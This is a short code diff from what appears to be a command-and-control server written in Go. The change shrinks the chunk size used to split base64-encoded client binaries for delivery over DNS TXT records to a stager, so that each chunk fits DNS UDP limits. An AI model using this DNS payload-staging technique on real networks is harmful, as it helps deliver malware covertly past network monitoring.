@@ -1168,9 +1168,9 @@ func (api *APIServer) handleListClientBinaries(w http.ResponseWriter, r *http.Re
 		// Calculate compressed size estimate (rough estimate: 40% of original)
 		compressedSize := int64(float64(info.Size()) * 0.4)
 
-		// Calculate chunk count
+		// Calculate chunk count (DNS-safe chunk size is 370 bytes)
 		base64Size := int64(float64(compressedSize) * 1.34) // base64 overhead
-		totalChunks := (base64Size + 402) / 403
+		totalChunks := (base64Size + 369) / 370
 
 		binary := map[string]interface{}{
 			"id":              filename,
@@ -1297,7 +1297,8 @@ func (api *APIServer) loadAndProcessClientBinary(osType, arch string) (string, s
 	fmt.Printf("[Master] Base64 encoded: %d bytes\n", len(base64Data))
 
 	// Calculate total chunks
-	const chunkSize = 403
+	// DNS UDP limit: 512 bytes - headers (~125 bytes) - "CHUNK|" (6 bytes) - TXT overhead (~10 bytes) = ~370 bytes safe
+	const chunkSize = 370
 	totalChunks := (len(base64Data) + chunkSize - 1) / chunkSize
 
 	fmt.Printf("[Master] Will split into %d chunks of %d bytes each\n", totalChunks, chunkSize)
@@ -1439,7 +1440,7 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 		SessionID:   sessionID,
 		TotalChunks: totalChunks,
 		DNSDomains:  nil, // Not needed - stager has domains compiled in
-		ChunkSize:   403,
+		ChunkSize:   370, // DNS-safe chunk size
 	}
 
 	api.sendJSON(w, response)
